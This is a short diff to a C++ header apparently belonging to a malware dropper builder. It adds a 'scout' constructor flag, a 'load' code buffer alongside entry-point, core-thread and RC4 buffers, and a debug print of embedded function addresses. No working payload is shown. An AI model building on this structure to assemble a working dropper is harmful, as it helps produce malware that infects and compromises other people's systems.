@@ -12,7 +12,7 @@ typedef struct _databuffer_t {
 class Components
 {
 public:
-	Components(void);
+	Components(BOOL bScout);
 	
 	const DataBuffer& entryPoint() { return entryPoint_; }
 	const DataBuffer& coreThread() { return coreThread_; }
@@ -21,11 +21,14 @@ public:
 	const DataBuffer& exitProcess() { return exitProcess_; }
 	const DataBuffer& exit() { return exit_; }
 	const DataBuffer& rc4() { return rc4_; }
+	const DataBuffer& load() { return load_; }
 	
 private:
 	
 	void embedFunction_(char const * const start, char const * const end, DataBuffer & buffer)
 	{
+		printf(" start: %08x end: %08x size: %08x\n", start, end, (DWORD)end - (DWORD)start);
+
 		std::size_t size = (DWORD)end - (DWORD)start;
 		
 #ifdef _DEBUG
@@ -45,6 +48,7 @@ private:
 	DataBuffer exitProcess_;
 	DataBuffer exit_;
 	DataBuffer rc4_;
+	DataBuffer load_;
 };
 
 #endif // DropperComponents_h__
